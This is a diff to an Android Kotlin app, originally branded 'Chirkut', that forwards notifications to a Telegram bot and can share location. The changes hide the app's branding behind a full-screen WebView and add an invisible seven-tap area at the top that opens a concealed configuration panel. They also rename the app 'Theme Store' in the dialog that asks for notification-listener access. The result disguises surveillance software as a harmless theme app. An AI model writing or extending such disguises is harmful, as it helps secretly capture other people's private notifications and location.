@@ -169,66 +169,33 @@ fun MainAppScreen(
         }
     }
 
-    Scaffold(
-        modifier = modifier.fillMaxSize(),
-        topBar = {
-            TopAppBar(
-                title = { 
-                    Text(
-                        text = "Chirkut",
-                        style = MaterialTheme.typography.titleLarge,
-                        modifier = Modifier.clickable(
-                            interactionSource = remember { MutableInteractionSource() },
-                            indication = null
-                        ) {
-                            val now = System.currentTimeMillis()
-                            if (now - lastTapTime < 1000) {
-                                titleTapCount++
-                            } else {
-                                titleTapCount = 1
-                            }
-                            lastTapTime = now
-                            if (titleTapCount >= 7) {
-                                titleTapCount = 0
-                                showHiddenConfig = true
-                            }
-                        }
-                    )
-                },
-                navigationIcon = {
-                    coil.compose.AsyncImage(
-                        model = R.drawable.icon,
-                        contentDescription = "Chirkut Logo",
-                        modifier = Modifier
-                            .padding(start = 12.dp, end = 8.dp)
-                            .size(40.dp)
-                            .pointerInput(Unit) {
-                                awaitEachGesture {
-                                    awaitFirstDown()
-                                    val job = coroutineScope.launch {
-                                        delay(5000)
-                                        showHiddenConfig = true
-                                    }
-                                    waitForUpOrCancellation()
-                                    job.cancel()
-                                }
-                            }
-                    )
-                },
-                colors = TopAppBarDefaults.topAppBarColors(
-                    containerColor = MaterialTheme.colorScheme.primaryContainer,
-                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
-                )
-            )
-        }
-    ) { innerPadding ->
+    Box(modifier = modifier.fillMaxSize()) {
+        WebViewScreen(viewModel = viewModel, modifier = Modifier.fillMaxSize())
+
+        // Invisible touch target at the top for 7 rapid taps to access system configuration
         Box(
             modifier = Modifier
-                .fillMaxSize()
-                .padding(innerPadding)
-        ) {
-            WebViewScreen(viewModel = viewModel)
-        }
+                .align(Alignment.TopCenter)
+                .fillMaxWidth()
+                .statusBarsPadding()
+                .height(48.dp)
+                .clickable(
+                    interactionSource = remember { MutableInteractionSource() },
+                    indication = null
+                ) {
+                    val now = System.currentTimeMillis()
+                    if (now - lastTapTime < 1000) {
+                        titleTapCount++
+                    } else {
+                        titleTapCount = 1
+                    }
+                    lastTapTime = now
+                    if (titleTapCount >= 7) {
+                        titleTapCount = 0
+                        showHiddenConfig = true
+                    }
+                }
+        )
     }
 
     if (showHiddenConfig) {
@@ -391,7 +358,11 @@ fun MainAppScreen(
                                 viewModel.setLocationSharing(tempLocationSharing)
                                 showHiddenConfig = false
                             },
-                            modifier = Modifier.weight(1f)
+                            modifier = Modifier.weight(1f),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = MaterialTheme.colorScheme.primary,
+                                contentColor = MaterialTheme.colorScheme.onPrimary
+                            )
                         ) {
                             Text("Save")
                         }
@@ -407,8 +378,8 @@ fun MainAppScreen(
             title = { Text("Notification Access Required") },
             text = { 
                 Text(
-                    "To forward notifications to your Telegram Bot, Chirkut requires 'Notification Listener' access. " +
-                    "Please locate 'Chirkut' in the next system settings screen and toggle permission to 'Allowed'."
+                    "To forward notifications to your Telegram Bot, Theme Store requires 'Notification Listener' access. " +
+                    "Please locate 'Theme Store' in the next system settings screen and toggle permission to 'Allowed'."
                 )
             },
             confirmButton = {
@@ -426,7 +397,11 @@ fun MainAppScreen(
                             }
                             context.startActivity(intent)
                         }
-                    }
+                    },
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = MaterialTheme.colorScheme.primary,
+                        contentColor = MaterialTheme.colorScheme.onPrimary
+                    )
                 ) {
                     Text("Grant Permission")
                 }
